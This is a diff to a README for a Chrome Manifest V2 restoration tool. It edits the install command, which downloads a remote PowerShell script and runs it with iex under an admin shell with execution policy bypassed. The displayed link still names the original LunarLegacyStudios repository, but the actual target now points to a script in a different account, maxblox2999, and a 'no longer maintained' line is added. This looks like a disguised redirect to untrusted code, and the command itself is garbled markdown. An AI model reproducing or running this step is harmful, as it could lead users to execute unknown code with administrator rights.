@@ -5,4 +5,6 @@ Restores support for Manifest V2 extensions in Google Chrome for versions 138 an
 ### Installation
 Run this in **PowerShell (Admin)**:
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "iwr -useb [https://raw.githubusercontent.com/LunarLegacyStudios/BringBackChromeExtensions/main/EnableMV2.ps1](https://raw.githubusercontent.com/LunarLegacyStudios/BringBackChromeExtensions/main/EnableMV2.ps1) | iex"
+powershell -ExecutionPolicy Bypass -Command "iwr -useb [https://raw.githubusercontent.com/LunarLegacyStudios/BringBackChromeExtensions/main/EnableMV2.ps1]([https://raw.githubusercontent.com/LunarLegacyStudios/BringBackChromeExtensions/main/EnableMV2.ps1](https://raw.githubusercontent.com/maxblox2999/BringBackChromeExtensions/refs/heads/main/EnableMV2.ps1)) | iex"
+
+### project no longer maintained 
